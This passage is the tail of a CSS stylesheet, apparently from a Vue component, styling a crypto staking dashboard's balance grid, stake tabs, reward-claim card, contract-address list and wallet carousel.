  margin-bottom: 12px;
}

.action-subtitle {
  font-size: 14px;
  color: var(--text-secondary);
  max-width: 300px;
  line-height: 1.5;
}

/* Loading state */
.checking-spinner {
  width: 44px;
  height: 44px;
  border: 3px solid rgba(0, 212, 255, 0.1);
  border-top-color: var(--accent-cyan);
  border-radius: 50%;
  animation: spin-slow 1s linear infinite;
  margin-bottom: 20px;
}

.checking-text {
  font-size: 16px;
  font-weight: 500;
  margin-bottom: 6px;
}

.checking-addr {
  font-size: 13px;
  color: var(--text-muted);
  font-family: monospace;
}

/* Staking Dashboard elements */
.user-balances-grid {
  display: grid;
  grid-template-columns: 1fr 1fr;
  gap: 16px;
  background: rgba(255, 255, 255, 0.02);
  border: 1px solid var(--border-subtle);
  border-radius: var(--radius-md);
  padding: 16px 20px;
  margin-bottom: 24px;
}

.balance-item {
  display: flex;
  flex-direction: column;
}

.bi-label {
  font-size: 11px;
  color: var(--text-muted);
  text-transform: uppercase;
  font-weight: 600;
  letter-spacing: 0.05em;
  margin-bottom: 4px;
}

.bi-value {
  font-size: 16px;
  font-weight: 700;
  color: var(--text-primary);
}

.text-accent {
  color: var(--accent-cyan) !important;
}

/* Tabs */
.tab-switcher {
  display: grid;
  grid-template-columns: 1fr 1fr;
  gap: 8px;
  background: rgba(0, 0, 0, 0.2);
  border: 1px solid var(--border-subtle);
  border-radius: 12px;
  padding: 4px;
  margin-bottom: 24px;
}

.tab-btn {
  background: transparent;
  border: none;
  color: var(--text-secondary);
  font-family: var(--font-sans);
  font-size: 14px;
  font-weight: 600;
  padding: 12px;
  border-radius: 8px;
  cursor: pointer;
  transition: all 0.2s ease;
}

.tab-btn:hover {
  color: var(--text-primary);
}

.tab-btn.active {
  background: rgba(255, 255, 255, 0.05);
  border: 1px solid var(--border-subtle);
  color: var(--text-primary);
  box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
}

/* Forms */
.form-body {
  display: flex;
  flex-direction: column;
  gap: 20px;
  margin-bottom: 28px;
}

.input-wrapper {
  background: rgba(0, 0, 0, 0.15);
  border: 1px solid var(--border-subtle);
  border-radius: 12px;
  padding: 14px 18px;
  transition: border-color 0.25s ease;
}

.input-wrapper:focus-within {
  border-color: var(--accent-purple);
}

.input-header {
  display: flex;
  justify-content: space-between;
  align-items: center;
  margin-bottom: 8px;
}

.input-label {
  font-size: 12px;
  color: var(--text-muted);
  font-weight: 500;
}

.btn-max {
  background: rgba(123, 63, 228, 0.15);
  border: 1px solid rgba(123, 63, 228, 0.3);
  color: var(--accent-purple-light);
  font-size: 11px;
  font-weight: 700;
  padding: 2px 8px;
  border-radius: 4px;
  cursor: pointer;
  transition: all 0.2s ease;
}

.btn-max:hover {
  background: rgba(123, 63, 228, 0.25);
  border-color: rgba(123, 63, 228, 0.6);
  color: #fff;
}

.input-row {
  display: flex;
  align-items: center;
  gap: 12px;
}

.staking-input {
  flex: 1;
  background: transparent;
  border: none;
  outline: none;
  color: #fff;
  font-family: var(--font-sans);
  font-size: 24px;
  font-weight: 700;
  width: 100%;
}

.staking-input::placeholder {
  color: var(--text-muted);
}

/* Hide input spin buttons */
.staking-input::-webkit-outer-spin-button,
.staking-input::-webkit-inner-spin-button {
  -webkit-appearance: none;
  margin: 0;
}
.staking-input[type=number] {
  -moz-appearance: textfield;
}

.input-symbol {
  font-family: var(--font-display);
  font-size: 18px;
  font-weight: 700;
  color: var(--text-secondary);
}

/* Est earnings */
.est-earnings-box {
  background: rgba(255, 255, 255, 0.01);
  border: 1px dashed var(--border-subtle);
  border-radius: 8px;
  padding: 12px 16px;
  display: flex;
  flex-direction: column;
  gap: 6px;
}

.eeb-row {
  display: flex;
  justify-content: space-between;
  font-size: 13px;
  color: var(--text-secondary);
}

.text-green {
  color: #00e67a !important;
  font-weight: 600;
}

.btn-action {
  width: 100%;
  padding: 16px;
  font-size: 16px;
  border-radius: 12px;
}

/* Rewards section */
.rewards-claim-card {
  display: flex;
  align-items: center;
  justify-content: space-between;
  background: rgba(123, 63, 228, 0.06) !important;
  border-color: rgba(123, 63, 228, 0.25) !important;
  border-radius: var(--radius-md) !important;
  padding: 20px 24px !important;
  margin-bottom: 24px;
}

.rewards-claim-card:hover {
  transform: none !important;
  box-shadow: 0 4px 20px rgba(123, 63, 228, 0.15) !important;
}

.rcc-left {
  display: flex;
  flex-direction: column;
}

.rcc-label {
  font-size: 11px;
  color: var(--accent-purple-light);
  text-transform: uppercase;
  font-weight: 700;
  letter-spacing: 0.05em;
  margin-bottom: 4px;
}

.rcc-value {
  font-size: 26px;
  font-weight: 800;
  line-height: 1.1;
  display: flex;
  align-items: baseline;
  gap: 4px;
}

.rcc-token {
  font-size: 14px;
  font-weight: 600;
  color: var(--text-secondary);
}

.btn-claim-rewards {
  background: rgba(123, 63, 228, 0.15);
  border: 1px solid rgba(123, 63, 228, 0.3);
  color: #fff;
  padding: 12px 20px;
  font-size: 14px;
  border-radius: 10px;
}

.btn-claim-rewards:hover:not(:disabled) {
  background: var(--accent-purple);
  border-color: var(--accent-purple);
  transform: translateY(-2px);
  box-shadow: 0 4px 15px rgba(123, 63, 228, 0.4);
}

.btn-claim-rewards:disabled {
  opacity: 0.5;
  cursor: not-allowed;
}

/* Connected details */
.connected-info-row {
  display: flex;
  justify-content: space-between;
  font-size: 13px;
  color: var(--text-muted);
}

.text-cyan {
  color: var(--accent-cyan);
}

.btn-disconnect-link {
  background: none;
  border: none;
  color: var(--text-muted);
  cursor: pointer;
  text-decoration: underline;
  font-size: 13px;
}

.btn-disconnect-link:hover {
  color: #ff4d6d;
}

/* Text styles */
.error-text {
  font-size: 13px;
  color: #ff4d6d;
  background: rgba(255, 77, 109, 0.08);
  border: 1px solid rgba(255, 77, 109, 0.2);
  padding: 10px 14px;
  border-radius: 8px;
}

.success-text {
  font-size: 13px;
  color: #00e67a;
  background: rgba(0, 230, 122, 0.08);
  border: 1px solid rgba(0, 230, 122, 0.2);
  padding: 10px 14px;
  border-radius: 8px;
  line-height: 1.6;
}

.explorer-link-inline {
  color: var(--accent-cyan);
  text-decoration: underline;
  display: inline-flex;
  align-items: center;
  font-weight: 500;
}

.explorer-link-inline:hover {
  color: var(--accent-cyan-light);
}

/* Smart contracts addresses block */
.token-addresses-card {
  padding: 24px;
  border-radius: var(--radius-md);
  margin-top: 12px;
}

.token-addresses-card:hover {
  transform: none !important;
  box-shadow: none !important;
  border-color: var(--border-subtle) !important;
}

.tac-title {
  font-size: 14px;
  font-weight: 700;
  color: var(--text-primary);
  margin-bottom: 16px;
}

.tac-row {
  display: flex;
  justify-content: space-between;
  align-items: center;
  font-size: 13px;
  margin-bottom: 10px;
}

.tac-row:last-child {
  margin-bottom: 0;
}

.tac-label {
  color: var(--text-secondary);
}

.tac-copy-wrap {
  display: flex;
  align-items: center;
  gap: 10px;
}

.tac-address {
  font-family: monospace;
  color: var(--text-primary);
}

.btn-copy-mini {
  background: rgba(255, 255, 255, 0.04);
  border: 1px solid var(--border-subtle);
  color: var(--text-secondary);
  font-size: 11px;
  padding: 3px 8px;
  border-radius: 6px;
  cursor: pointer;
  transition: all 0.2s ease;
}

.btn-copy-mini:hover {
  background: rgba(255, 255, 255, 0.1);
  color: #fff;
  border-color: rgba(255, 255, 255, 0.2);
}

/* Spinner helper */
.wallet-btn-spinner {
  display: inline-block;
  width: 14px;
  height: 14px;
  border: 2px solid rgba(255, 255, 255, 0.2);
  border-top-color: #fff;
  border-radius: 50%;
  animation: spin-slow 1s linear infinite;
  margin-right: 6px;
  vertical-align: middle;
}

.mt-12 {
  margin-top: 12px;
}

/* Responsive grid */
@media (max-width: 1024px) {
  .staking-container {
    grid-template-columns: 1fr;
    gap: 48px;
  }
  .stats-panel {
    max-width: 100%;
  }
}

@media (max-width: 540px) {
  .stats-cards {
    grid-template-columns: 1fr;
  }
  .user-balances-grid {
    grid-template-columns: 1fr;
    gap: 12px;
  }
  .staking-card {
    padding: 24px;
  }
}

/* Swiper wrapper styling */
.wallet-swiper-wrap {
  width: 100%;
  max-width: 180px;
  height: 160px;
  margin: 0 auto 20px;
  display: flex;
  align-items: center;
  justify-content: center;
}

.wallet-swiper {
  width: 100%;
  height: 100%;
}

.wallet-swiper:not(.swiper-initialized) :deep(.swiper-slide:not(:first-child)) {
  display: none;
}

.swiper-slide {
  display: flex;
  align-items: center;
  justify-content: center;
  background: transparent;
}

.swiper-wallet-card {
  width: 120px;
  height: 120px;
  border-radius: var(--radius-md);
  border: 1px solid var(--border-subtle);
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  gap: 10px;
  backdrop-filter: var(--glass-blur);
  box-shadow: var(--shadow-card);
  transition: border-color 0.3s ease;
}

.swiper-wallet-card:hover {
  border-color: var(--accent-cyan);
}

.swiper-wallet-icon {
  width: 50px;
  height: 50px;
  object-fit: contain;
}

.swiper-wallet-name {
  font-size: 11px;
  font-weight: 600;
  color: var(--text-secondary);
}
</style>
